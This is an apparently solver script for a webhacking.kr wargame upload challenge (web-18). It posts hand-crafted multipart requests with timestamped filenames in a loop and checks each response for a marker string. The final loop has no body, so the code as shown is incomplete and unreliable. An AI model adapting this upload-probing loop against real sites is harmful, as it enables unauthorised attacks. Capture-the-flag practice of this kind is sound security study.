import requests
import time
# import re

url = 'http://webhacking.kr/challenge/web/web-18/index.php'


def Post(filename):
    payload = """
------WebKitFormBoundaryh1qGfFl3YRmgOyBG
Content-Disposition: form-data; name="upfile"; filename="%s"
Content-Type: application/octet-stream

------WebKitFormBoundaryh1qGfFl3YRmgOyBG--
""" % (filename)
    header = {
        'Content-Length': 220,
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryh1qGfFl3YRmgOyBG'}
    try:
        r = requests.post(url, data=payload, headers=header, cookies={
            'PHPSESSID': ''})

        if ('</pre>127.0.0.1:7777<br>' in r.content) != True:
            print r.content
        return '</pre>127.0.0.1:7777<br>' in r.content

    except Exception as e:
        print e
        return e


def GenFilename():
    filename = 'tmp-' + str(int(time.time()))
    print filename
    return filename

while Post(GenFilename()):

    # print Post('test')
